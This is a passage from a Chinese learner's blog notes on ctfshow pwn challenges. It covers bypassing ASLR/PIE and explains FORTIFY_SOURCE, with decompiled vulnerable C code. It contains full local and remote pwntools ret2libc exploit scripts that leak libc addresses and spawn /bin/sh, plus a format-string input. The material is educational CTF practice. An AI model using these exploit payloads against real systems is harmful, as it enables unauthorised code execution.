class="line">  <span class="built_in">puts</span>(asc_AE4);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B78);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Bypass ALSR &amp; PIE &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 有溢出，但是开启了保护，所以之前的exp打不了</span></span><br></pre></td></tr></table></figure></div><ul><li>已知main函数地址，可以通过计算偏移得到程序本身的加载地址</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地exp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从程序输出中读取main函数的地址。通常，这一步需要在二进制程序中有特定的输出，以便读取main函数的地址</span></span><br><span class="line">main = <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算二进制文件的基地址，这是通过从读取到的main函数地址减去main函数在ELF文件中的偏移量得出的</span></span><br><span class="line">base = main - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用基地址来计算ctfshow函数地址、write函数的PLT地址、write函数的GOT地址以及一个用于存放参数的寄存器（ebx）的地址</span></span><br><span class="line">ctfshow = base + elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">write_plt = base + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = base + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ebx = base + <span class="number">0x1fc0</span>  <span class="comment"># 这个怎么得到的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload来泄露write函数在libc中的地址</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">132</span> + p32(ebx) + <span class="string">&quot;AAAA&quot;</span> + p32(write_plt) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">write = u32(io.recv())  <span class="comment"># 这行不太懂。。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用泄漏的write地址来确定libc基地址，进而计算system函数和/bin/sh字符串的地址</span></span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload来调用system函数并传递/bin/sh作为参数</span></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,10000)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28161</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;</span>)</span><br><span class="line">main = <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line"></span><br><span class="line">base = main - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ctfshow = base + elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">write_plt = base + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = base + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ebx = base + <span class="number">0x1fc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">132</span> + p32(ebx) + <span class="string">&quot;AAAA&quot;</span> + p32(write_plt) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">write = u32(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="032-FORTIFY-SOURCE-0"><a class="header-anchor" href="#032-FORTIFY-SOURCE-0">¶</a>032 FORTIFY_SOURCE=0</h3><ul><li><p>禁用Fortify功能，不会进行任何额外的安全检查，可能导致潜在的安全漏洞</p></li><li><p>FORTIFY_SOURCE 是一个 C/C++ 编译器提供的安全保护机制，旨在<strong>防止缓冲区溢出</strong>和<strong>其他与字符串和内存操作相关</strong>的安全漏洞。它是在<strong>编译时自动插入</strong>的一组额外代码，用于增强程序对于缓冲区溢出和其他常见安全问题的防护。</p></li><li><p>FORTIFY_SOURCE 提供了以下主要功能：</p></li><li><p><strong>1. 运行时长度检查</strong></p><ul><li>FORTIFY_SOURCE 会在编译时自动将长度检查代码插入到一些危险的库函数中，例如 strcpy 、 strcat 、 sprintf 等。这些代码会检查目标缓冲区的长度，以确保操作不会导致溢出。如果检测到溢出情况，程序会立即终止，从而防止潜在的漏洞利用。</li></ul></li><li><p><strong>2. 缓冲区溢出检测</strong>：</p><ul><li>FORTIFY_SOURCE 还会将额外的保护机制添加到一些敏感的库函数中，例如 memcpy 、 memmove 、 memset 等。这些机制可以检测传递给这些函数的源和目标缓冲区是否有重叠，并防止潜在的缓冲区溢出</li></ul></li><li><p><strong>3. 安全警告和错误报告：</strong></p><ul><li>当 FORTIFY_SOURCE 检测到潜在的缓冲区溢出或其他安全问题时，它会生成相应的警告和错误报告</li></ul></li><li><p>FORTIFY_SOURCE 提供了一层额外的安全保护，它可以在很大程度上减少常见的缓冲区溢出和字符串操作相关的安全漏洞</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn032/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位  仅关闭Canary保护</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+4h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">11</span>]; <span class="comment">// [rsp+Ah] [rbp-3Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">11</span>]; <span class="comment">// [rsp+15h] [rbp-33h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = getegid();</span><br><span class="line">  setresgid(v3, v3, v3);</span><br><span class="line">  logo();</span><br><span class="line">  v4 = argv[<span class="number">1</span>];</span><br><span class="line">  *(_QWORD *)buf1 = *(_QWORD *)v4;</span><br><span class="line">  *(_WORD *)&amp;buf1[<span class="number">8</span>] = *((_WORD *)v4 + <span class="number">4</span>);</span><br><span class="line">  buf1[<span class="number">10</span>] = v4[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;CTFshowPWN&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  v5 = strtol(argv[<span class="number">3</span>], <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(buf1, argv[<span class="number">2</span>], v5);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  fgets(buf1, <span class="number">11</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(buf1, &amp;num);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">4</span> )</span><br><span class="line">    Undefined();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第一题关闭了此保护，输入的argv1明显会导致buf1溢出，但是程序仍可以正常运行 */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">Undefined</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;The source code of these three programs is the same, and the results of turning on different levels of protection are understood\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You should understand the role of these protections!But don&#x27;t just get a flag\nHere is your flag:\n&quot;</span>);</span><br><span class="line">  v0 = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">64</span>, v0);</span><br><span class="line">  <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 打开并打印flag */</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./pwn AAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB 6</span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB CTFshowPWN</span><br><span class="line">A AAAAAAAAAAA</span><br><span class="line">%2$x</span><br><span class="line">be8b8d0</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure></div><ul><li>这个知识点不太懂。。</li></ul><h3 id="033-FORTIFY-SOURCE-1"><a class="header-anchor" href="#033-FORTIFY-SOURCE-1">¶</a>033 FORTIFY_SOURCE=1</h3><ul><li>启用 Fortify 功能的基本级别。</li><li>在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。 在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行</li></ul><p>to be continued</p></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>标题:</strong> 【Pvvn】000-036知识点记录</li><li><strong>作者:</strong> bcmp</li><li><strong>创建于 :</strong> 2024-07-17 00:00:00</li><li><strong>更新于 :</strong> 2024-07-22 17:07:29</li><li><strong>链接:</strong> https://brocademaple.life/2024/07/17/CS_Notes/PWN/【Pvvn】000-036知识点记录/</li><li><strong>版权声明: </strong>本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。</li></ul></div></div><ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden"><li class="tag-item mx-0.5"><a href="/tags/CS-Notes/">#CS Notes</a>&nbsp;</li><li class="tag-item mx-0.5"><a href="/tags/Pwn/">#Pwn</a>&nbsp;</li></ul><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="prev" rel="prev" href="/2024/07/19/CS_Notes/AI/AI+%E5%BC%80%E5%8F%91/%E3%80%90AI_indoor%E3%80%91AI%E8%BE%85%E5%8A%A9Java%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item">【AI_indoor】AI辅助Java编程开发</span> <span class="post-nav-item">上一篇</span></span></a></div><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/2024/07/16/CS_Notes/PWN/%E3%80%90Pwn%E3%80%91wp%E5%AD%98%E6%A1%A3/"><span class="title flex justify-center items-center"><span class="post-nav-title-item">【Pvvn】vvp留档</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">目录</div><div class="page-title">【Pvvn】000-036知识点记录</div><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#000-ssh%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BD%A9%E8%9B%8B%E9%A2%98"><span class="nav-text">000 ssh连接的彩蛋题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFssh%E8%BF%9E%E6%8E%A5"><span class="nav-text">什么是ssh连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFshell"><span class="nav-text">什么是shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8shell%E4%B8%AD%E8%BE%93%E5%85%A5id"><span class="nav-text">在shell中输入id</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ls-%E5%8C%BA%E5%88%AB%E4%BA%8Els%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-text">ls &#x2F;区别于ls的作用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#001-nc%E8%BF%9E%E6%8E%A5-%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0"><span class="nav-text">001 nc连接+后门函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFnc%E8%BF%9E%E6%8E%A5"><span class="nav-text">什么是nc连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc%E8%BF%9E%E6%8E%A5%E5%92%8Cssh%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%85%B3%E8%81%94%E5%92%8C%E5%8C%BA%E5%88%AB"><span class="nav-text">nc连接和ssh连接的关联和区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#checksec"><span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#system-%E2%80%9Ccat-ctfshow-flag%E2%80%9D-%E6%98%AF%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-text">system(“cat &#x2F;ctfshow_flag”)是后门函数的原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0"><span class="nav-text">后门函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8%E6%9C%AC%E5%9C%B0%E5%86%99%E5%85%A5%E4%B8%80%E4%B8%AAflag%E6%96%87%E4%BB%B6%E4%BD%9C%E4%B8%BA%E6%B5%8B%E8%AF%95"><span class="nav-text">在本地写入一个flag文件作为测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-shell-%E5%88%86%E6%9E%90c%E4%BB%A3%E7%A0%81"><span class="nav-text">002 shell+分析c代码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#setvbuf%E8%B0%83%E7%94%A8"><span class="nav-text">setvbuf调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#system-%E2%80%9C-bin-sh%E2%80%9D-%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-text">system(“&#x2F;bin&#x2F;sh”)的工作原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#003-%E7%9C%9F%E5%81%87%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89"><span class="nav-text">003 真假命令（一）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#004-%E7%9C%8BC%E4%BB%A3%E7%A0%81"><span class="nav-text">004 看C代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#005-012-%E4%BA%86%E8%A7%A3%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F%E2%80%99"><span class="nav-text">005-012 了解寄存器、寻址方式’</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81"><span class="nav-text">汇编代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#005-%E8%BF%90%E8%A1%8C%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="nav-text">005 运行可执行文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#006-%E7%AB%8B%E5%8D%B3%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F"><span class="nav-text">006 立即寻址方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#007-%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F"><span class="nav-text">007 寄存器寻址方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#008-%E7%9B%B4%E6%8E%A5%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F"><span class="nav-text">008 直接寻址方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#009-%E5%AF%84%E5%AD%98%E5%99%A8%E9%97%B4%E6%8E%A5%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F"><span class="nav-text">009 寄存器间接寻址方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#010-%E5%AF%84%E5%AD%98%E5%99%A8%E7%9B%B8%E5%AF%B9%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F"><span class="nav-text">010 寄存器相对寻址方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#011-%E5%9F%BA%E5%9D%80%E5%8F%98%E5%9D%80%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F"><span class="nav-text">011 基址变址寻址方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#012-%E7%9B%B8%E5%AF%B9%E5%9F%BA%E5%9D%80%E5%8F%98%E5%9D%80%E5%AF%BB%E5%9D%80"><span class="nav-text">012 相对基址变址寻址</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#013-gcc%E7%BC%96%E8%AF%91"><span class="nav-text">013 gcc编译</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#014-gcc%E7%BC%96%E8%AF%91-c%E6%96%87%E4%BB%B6"><span class="nav-text">014 gcc编译.c文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#015-%E7%BC%96%E8%AF%91%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81"><span class="nav-text">015 编译汇编代码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E2%86%92%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E2%86%92%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="nav-text">汇编语言→目标文件→可执行文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#016-gcc%E7%BC%96%E8%AF%91-s%E6%96%87%E4%BB%B6"><span class="nav-text">016 gcc编译.s文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#017-Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E7%9A%84%E6%8B%BC%E6%8E%A5"><span class="nav-text">017 Linux基础命令的拼接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#018-%E7%9C%8B%E6%BA%90%E7%A0%81%E5%96%B5"><span class="nav-text">018 看源码喵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#019-%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%EF%BC%88%E8%BF%98%E6%98%AF%E6%9C%89%E4%B8%80%E7%82%B9%E7%82%B9%E6%87%B5"><span class="nav-text">019 父子进程（还是有一点点懵</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%BD%93%E7%84%B6%E7%8E%B0%E5%9C%A8%E8%BF%98%E4%B8%8D%E7%9F%A5%E9%81%93%E5%92%8B%E6%90%9E"><span class="nav-text">反弹shell（当然现在还不知道咋搞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E9%80%89%E6%8B%A9%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-text">1. 选择反弹shell的命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%9C%A8%E4%BD%A0%E7%9A%84%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="nav-text">2. 在你的机器上监听端口</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4"><span class="nav-text">3. 在目标机器上执行反弹shell命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E8%BE%93%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4"><span class="nav-text">4. 输入反弹shell命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-text">示例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#020-got%E5%92%8C-got-plt%E8%A1%A8"><span class="nav-text">020 .got和.got.plt表</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RELRO%E4%BF%9D%E6%8A%A4"><span class="nav-text">RELRO保护</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%89%E7%A7%8D%E7%8A%B6%E6%80%81"><span class="nav-text">三种状态</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" 